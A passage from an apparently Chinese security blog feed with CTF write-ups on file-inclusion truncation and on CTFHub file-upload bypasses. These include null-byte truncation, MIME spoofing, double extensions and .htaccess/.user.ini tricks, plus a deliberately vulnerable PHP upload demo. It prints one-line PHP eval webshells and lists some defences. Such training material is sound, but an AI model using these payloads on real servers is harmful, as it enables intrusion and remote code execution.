class="headerlink" title="2.超长字符截断"></a>2.超长字符截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</span><br><span class="line">    我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。</span><br><span class="line">    而利用&quot;./&quot;的方式即可构造出超长目录字符串</span><br><span class="line">防御：</span><br><span class="line">    限制用户输入字符长度</span><br></pre></td></tr></table></figure><h2 id="3-任意目录遍历"><a href="#3-任意目录遍历" class="headerlink" title="3.任意目录遍历"></a>3.任意目录遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    使用&quot;../../../&quot;这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)&quot;。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)</span><br><span class="line">防御：</span><br><span class="line">    目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。</span><br><span class="line">    open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)</span><br></pre></td></tr></table></figure><h2 id="4-问号截断"><a href="#4-问号截断" class="headerlink" title="4.问号截断"></a>4.问号截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?</span><br><span class="line">防御：</span><br><span class="line">    关闭远程文件包含的配置选项allow_url_include = Off</span><br></pre></td></tr></table></figure><h2 id="5-防御总结"><a href="#5-防御总结" class="headerlink" title="5.防御总结"></a>5.防御总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、无需情况下设置allow_url_include和allow_url_fopen为关闭</span><br><span class="line">2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</span><br><span class="line">3、尽量不使用动态包含</span><br><span class="line">4、严格检查变量是否已经初始化。</span><br><span class="line">5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</span><br><span class="line">6、严格检查include类的文件包含函数中的参数是否外界可控。</span><br><span class="line">7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</span><br><span class="line">8、在发布应用程序之前测试所有已知的威胁。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传绕过之00截断</title>
      <link href="/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/"/>
      <url>/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>00截断</p><span id="more"></span><p>00截断是文件上传时的bypass手段之一</p><h1 id="【00截断原理】"><a href="#【00截断原理】" class="headerlink" title="【00截断原理】"></a>【00截断原理】</h1><p>谈到00截断我们都会想到，有什么0x00截断，%00截断，也有人对两个东西分析一大堆，那么它俩有什么区别呢，什么场合适用哪一个呢？这就要从00截断的原理说起：<br>其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:chr（0）<br>chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。<br>那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是空字符，而截断的关键就是这个空字符，当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。<br>这种情况常出现在ASP程序中，PHP 版本&lt;5.3.4时也会有这个情况，JSP中也会出现。<br>那么就可以知道00截断的原理了，在后缀中插入一个空字符（不是空格），会导致之后的部分被丢弃，而导致绕过的发生。如：在文件1.php.jpg中插入空字符变成：1.php.0x00.jpg中，解析后就会只剩下1.php，而空字符怎么插入的呢？通常我们会用Burp抓包后，在文件名插入一个空格，然后再HEX中找到空格对应的16进制编码“20”，把它改成00（即16进制ASCII码00，对应十进制的0），就可以插入空字符了。PS:这里的空格纯粹只是一个标记符号，便于我们找到位置，其实这里是什么字符都无所谓，只不过空格比较有特异性，方便在HEX中查找位置</p><h1 id="如何利用00截断"><a href="#如何利用00截断" class="headerlink" title="如何利用00截断"></a>如何利用00截断</h1><p>知道了基本原理之后，我们还要分析它怎么起作用，如果按照上述的做法来做，则00绕过只能绕过前端验证，因为如果是后端验证，那么即使后缀被截断了，处理之后为.php，还是会被后端验证拦截，所以不是什么情况下00截断都有用的，不过这里至少可以确定，在绕过前端验证可以用。在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效。<br>那么如果我们想在后端绕过也用00截断呢，这里就不能对文件名进行截断了，比如文件后缀检测代码如下时</p><p><img src="/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/20190526210223145.png" alt="20190526210223145.png (986×280)"></p><p>  如果在Burp中直接改filename，根本无法起作用，因为截断的只是后缀名，只能绕过简单的前端验证，到后端碰到上图的代码，在提取上传文件后缀的时候后缀还是.php，肯定会被拦，<strong>也就是说这里00截断没有发挥任何“绕过”后端验证的作用。</strong></p><h1 id="文件上传的条件"><a href="#文件上传的条件" class="headerlink" title="文件上传的条件"></a>文件上传的条件</h1><p>1.后缀检测，合格则进行上传路径拼接<br>2.拼接路径和文件名，组成文件上传路径</p><p>这里决定文件上传后被保存在文件夹中的真实后缀名的是文件上传路径，因为上面一大堆代码只不过是对后缀名进行各种处理和验证，这里相当于一个过安检的过程，最后决定文件到底是什么名字，什么后缀名，要看<strong>“文件上传路径”</strong><br>在我的一篇博客“文件上传漏洞靶场关键源码分析”中提到过这个问题，决定最后上传文件的真实后缀名的是拼接路径的方法，而不是那个校验了半天的后缀最后被处理成了个什么东西，这只是一个单纯的安检过程，不一定是最后final的后缀名，比如</p><p><img src="/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/20190526211410164.png"></p><p>这个源码中的文件路径是上传路径和文件名拼接的，也就是说也许上面的后缀被处理了半天能通过安检了，但是最后上传后的文件后缀却不一定这个被处理了半天的“后缀”，不明白的可以去看看我的上一篇博客。这里拼接的是$file_name这个变量，它和后缀名变量<br>$file_ext是不同的， $file_name没有经历那一堆安检处理，只是从它身上截取出了一个<br>$file_ext变量拿去安检，因此这里用 $file_name来拼接路径的话，还是有可能蒙混过关的，比如这里就可以构造<br>xxx.php.空格. 来进行绕过。 扯远了，回到00截断，说了这么多，也就是说想使用00截断绕过后端验证，除非两个条件之一：<br>1.路径拼接像上图的代码一样，直接使用的 $file_name这个文件名，而不是 $file_ext和其他什么东西来拼成一个文件名字，这时文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。<br>2.文件路径可控，比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃，因为这里已经到了“最后阶段”，不会再有安检过程了，这里截断之后的结果就是最终上传的结果，比如下图中，抓到的包里发现了路径，那么使用上面的方法直接改它，就可以成功上传aa.php文件，不管被处理后的文件名是什么，在这里被截断才是真正的“截断”，因为这是在安检（后缀名校验）之后进行的截断，直接决定真实的文件后缀名</p><p><img src="/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/20190526212439994.png" alt="20190526212439994.png (700×617)"></p><h1 id="【0x00h和-00】"><a href="#【0x00h和-00】" class="headerlink" title="【0x00h和%00】"></a>【0x00h和%00】</h1><p>它们最终的结果都是一样的，都代表着chr(0)，即空字符，只不过使用的位置不同，0x00代表16进制的空字符00，需要在HEX中改为00，进行截断，而%00是URL解码之前的字符，它被解码成16进制ASCII码之后实际上也是0x00，所以它们最终都对应的是空字符，这里%00可以用在URL中如xx.php?filename=test.php%00.txt，也可以直接插在Burp包中的路径中，如path=shell.jpg%00.txt</p>]]></content>
      
      
      <categories>
          
          <category> 知识类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub中文件上传刷题</title>
      <link href="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/"/>
      <url>/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>一些关于文件上传的题</p><span id="more"></span><h1 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h1><p>打开题目，发现是无限制的</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215191710053.png" alt="image-20220215191710053"></p><p>首先上传含一句话木马的文件，使用bp抓包，发现并没有什么有用的信息</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215192011150.png" alt="image-20220215192011150"></p><p>所以直接submit</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215192202508.png" alt="image-20220215192202508"></p><p>得到了上传后的文件路径，打开蚁剑，连接后查看目录，顺利找到flag</p><h1 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h1><p>打开题目，发现是前端验证</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215192625488.png" alt="image-20220215192625488"></p><p>上传了一个木马文件后发现，该形式不允许上传</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215192803996.png" alt="image-20220215192803996"></p><p>显然，上传图片码之后用bp抓包得到</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215193005955.png" alt="image-20220215193005955"></p><p>把划线部分改为shell.php，点击forward得到了文件的路径</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215193205853.png" alt="image-20220215193205853"></p><p>用蚁剑连接，在目录里找到了flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215193458893.png" alt="image-20220215193458893"></p><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><p>首先要了解什么是.htaccess文件</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/2ea3a70b789acadd373726d12bdc35d0.png"></p><p>首先先上传一个.htaccess文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这段内容的作用是让上传的所有文件都会被解析为php文件</p><p>新建一个文档，把后缀名改为.htaccess</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215202727504.png" alt="image-20220215202727504"></p><p>上传之后，再上传一个图片码，或者是jpg或png文件（内容为一句话木马）</p><p>然后就成功得到了文件的路径</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215202608340.png" alt="image-20220215202608340"></p><p>使用蚁剑连接之后</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215203108241.png" alt="image-20220215203108241"></p><p>在目录中成功找到flag  </p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215202953402.png" alt="image-20220215202953402"></p><h1 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h1><p>首先先了解什么是MIME验证</p><p>关于MIME<br>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p><p>下面是具体举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> </span><br><span class="line"> /**  </span><br><span class="line"> </span><br><span class="line">  * Created by 影影之家</span><br><span class="line"> </span><br><span class="line"> * Date: 22-2-15  </span><br><span class="line"> </span><br><span class="line">  * Time: 下午8:35  </span><br><span class="line"> </span><br><span class="line"> //文件上传漏洞演示脚本之MIME验证  </span><br><span class="line"> </span><br><span class="line"> $uploaddir = &#x27;uploads/&#x27;;  </span><br><span class="line"> </span><br><span class="line"> if (isset($_POST[&#x27;submit&#x27;])) &#123;  </span><br><span class="line"> </span><br><span class="line">     if (file_exists($uploaddir)) &#123;  </span><br><span class="line"> </span><br><span class="line">        if (($_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;) || ($_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) ||  </span><br><span class="line"> </span><br><span class="line">            ($_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;] == &#x27;image/bmp&#x27;)  </span><br><span class="line"> </span><br><span class="line">         ) &#123;  </span><br><span class="line"> </span><br><span class="line">             if (move_uploaded_file($_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;], $uploaddir . &#x27;/&#x27; . $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;])) &#123;  </span><br><span class="line"> </span><br><span class="line">                 echo &#x27;文件上传成功，保存于：&#x27; . $uploaddir . $_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;] . &quot;n&quot;;  </span><br><span class="line"> </span><br><span class="line">            &#125;  </span><br><span class="line"> </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line"> </span><br><span class="line">             echo &#x27;文件类型不正确，请重新上传！&#x27; . &quot;n&quot;;  </span><br><span class="line"> </span><br><span class="line">         &#125;  </span><br><span class="line"> </span><br><span class="line">     &#125; else &#123;  </span><br><span class="line"> </span><br><span class="line">         exit($uploaddir . &#x27;文件夹不存在,请手工创建！&#x27;);  </span><br><span class="line"> </span><br><span class="line">     &#125;  </span><br><span class="line"> </span><br><span class="line">     //print_r($_FILES);  </span><br><span class="line"> </span><br><span class="line"> &#125;  </span><br><span class="line"> </span><br><span class="line"> ?&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; </span><br><span class="line"> </span><br><span class="line">     &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;head&gt;  </span><br><span class="line"> </span><br><span class="line">     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gbk&quot;/&gt;  </span><br><span class="line"> </span><br><span class="line">     &lt;meta http-equiv=&quot;content-language&quot; content=&quot;zh-CN&quot;/&gt;  </span><br><span class="line"> </span><br><span class="line">     &lt;title&gt;文件上传漏洞演示脚本--MIME验证实例&lt;/title&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;body&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;h3&gt;文件上传漏洞演示脚本--MIME验证实例&lt;/h3&gt;  </span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;upload&quot;&gt;  </span><br><span class="line"> </span><br><span class="line">     请选择要上传的文件：&lt;input type=&quot;file&quot; name=&quot;upfile&quot;/&gt;  </span><br><span class="line"> </span><br><span class="line">     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;  </span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line"> </span><br><span class="line"> &lt;/body&gt;  </span><br><span class="line"> </span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>MIME验证绕过方法:<br>关于如何判断服务端是MIME验证，这个我们可以多上传几次来测试即可，那么如何绕过呢？ 直接更改上传数据包中的Content-type即可。</p><p>下面开始做题，打开题目先上传包含一句话木马的文件</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215204839381.png" alt="image-20220215204839381"></p><p>显示格式不对，那么格式为图片形式</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215205654670.png" alt="image-20220215205654670"></p><p>所以上传一句话木马后，bp抓包把画线处改为image/png</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215210443750.png" alt="image-20220215210443750">得到了文件的相对路径</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215210106171.png"></p><p>用蚁剑连接后在目录中找到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215210034997.png" alt="image-20220215210034997"></p><h1 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h1><p>首先了解以下什么是文件头检测</p><p>文件头检测是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传。</p><p>下面开始写题</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215210923317.png" alt="image-20220215210923317"></p><p>随便上传一个文件之后，发现对文件有限制</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215211107293.png" alt="image-20220215211107293"></p><p>所以直接上传图片码，bp抓包修改以下划线的数据，改为shell.php</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215211546368.png" alt="image-20220215211546368"></p><p>得到了文件路径</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215211657003.png" alt="image-20220215211657003">使用蚁剑连接</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215211810611.png" alt="image-20220215211810611"></p><p>在目录中得到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215211847493.png" alt="image-20220215211847493"></p><h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><p>简单了解一下00截断</p><p>1.截断原理：<br>0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。<br>2.00截断的限制条件<br>00截断有限制，php版本得低于5.3，并且GPC得关闭，一般在url上。<br>两种方法，%00和0x00,后台读取是遇到%00就会停止。<br>举个例子，url中输入的是upload/shell.php%00，那么后台读取到是upload/shell.php，就实现了绕后目的。</p><p>下面开始做题</p><p>打开题目之后上传含一句话木马的文件，发现格式不对</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215212614784.png" alt="image-20220215212614784"></p><p>上传png格式的文件看到有白名单（jpg，png，gif）</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215213738287.png" alt="image-20220215213738287"></p><p>重新上传图片码，使用bp抓包</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215215014806.png" alt="image-20220215215014806"></p><p>添加第一行画线数据（两处画线的地方要一致），然后上传，如此修改的原因是url中输入的是upload/shell.php%00，那么后台读取到是upload/shell.php，就实现了绕后目的</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215215132476.png" alt="image-20220215215132476"></p><p>上传成功</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215214223100.png" alt="image-20220215214223100"></p><p>使用蚁剑连接</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215215308125.png" alt="image-20220215215308125"></p><p>在目录中得到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215214519794.png" alt="image-20220215214519794"></p><h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>简单了解一下其原理</p><p>黑名单会给出一些不可使用的后缀名。<br>将写入一句话木马的php文件上传，抓包，将后缀改为.pphphp即可，双写即可绕过。<br>思路不唯一，各种后缀也是各种双写。</p><p>下面开始写题</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215220704324.png" alt="image-20220215220704324"></p><p>上传一句话木马后修改后缀为shell.pphphp</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215221000632.png" alt="image-20220215221000632"></p><p>得到相对路径</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215221056271.png" alt="image-20220215221056271"></p><p>用蚁剑连接，在目录中找到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220215221215847.png" alt="image-20220215221215847"></p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220225134223750.png" alt="image-20220225134223750"></p><p>打开题目之后先上传图片码，发现文件内容不合规，但是上传一个不带木马的文件就可以，说明一句话木马里面有敏感信息</p><p>使用短标签可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;? eval($_POST[1]);?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;% eval($_POST[1]);%&gt;</span><br></pre></td></tr></table></figure><p>传入png木马也可以，但是php文件加了png文件头也没用</p><p>可以说明php就是无法使用</p><p>所以考虑使用配置文件.user.ini</p><p>文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=shell.png</span><br></pre></td></tr></table></figure><p>但是上传的时候文件需要改为png格式</p><p>上传此文件之后进行抓包，将划线部分改为<code>.user.ini</code></p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220225135653042.png" alt="image-20220225135653042"></p><p>之后上传图片码，再进行抓包</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220225135929418.png" alt="image-20220225135929418"></p><p>将画线部分进行大小写绕过</p><p>然后访问/upload/index.php,发现内容都已被解析</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220225140122872.png" alt="image-20220225140122872"></p><p>再用蚁剑连接，得到flag</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220225140227319.png" alt="image-20220225140227319"></p><h1 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h1><p>经过测试，题目过滤掉了php，大小写绕过也不行</p><p><img src="/2022/02/15/ctfhub%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98/image-20220303202939538.png" alt="image-20220303202939538"></p><p>用正常的标签&lt;?php 肯定会被拦截，所以只能用短标签</p><p>先上传.user.ini,再上传shell.png</p><p><img 